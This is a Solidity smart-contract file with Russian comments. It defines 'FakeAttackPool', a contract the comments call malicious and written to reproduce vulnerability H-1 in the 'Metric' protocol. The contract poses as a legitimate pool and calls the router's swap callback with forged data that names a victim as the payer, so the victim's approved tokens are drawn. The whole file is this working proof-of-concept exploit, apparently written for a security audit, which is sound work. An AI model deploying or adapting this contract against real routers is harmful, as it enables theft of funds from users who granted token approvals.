// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

interface IRouterCallback {
    function metricOmmSwapCallback(int256 amount0, int256 amount1, bytes calldata data) external;
}

/**
 * @title FakeAttackPool
 * @notice Вредоносный контракт для воспроизведения уязвимости H-1 протокола Metric.
 * @dev Имитирует поведение легитимного пула, но подменяет адрес плательщика в колбэке.
 */
contract FakeAttackPool {
    address public immutable router;
    address public immutable victim;
    address public immutable token;

    // Структура, которую ожидает оригинальный роутер Metric
    struct JustPayCallbackData {
        address tokenToPay;
        address payer;
    }

    constructor(address _router, address _victim, address _token) {
        router = _router;
        victim = _victim;
        token = _token;
    }

    /**
     * @notice Точка входа для атаки. Имитирует функцию swap оригинального пула.
     */
    function attackSwap(uint256 amount) external {
        // Хакерский трюк: пул полностью игнорирует входящие параметры 
        // и отправляет в роутер колбэк со сфабрикованными данными.
        // Вместо адреса пула или хакера, мы подставляем адрес ЖЕРТВЫ (victim)!
        bytes memory fakeData = abi.encode(JustPayCallbackData({
            tokenToPay: token,
            payer: victim
        }));

        // Вызываем колбэк роутера от имени этого "пула"
        IRouterCallback(router).metricOmmSwapCallback(int256(amount), 0, fakeData);
    }
}
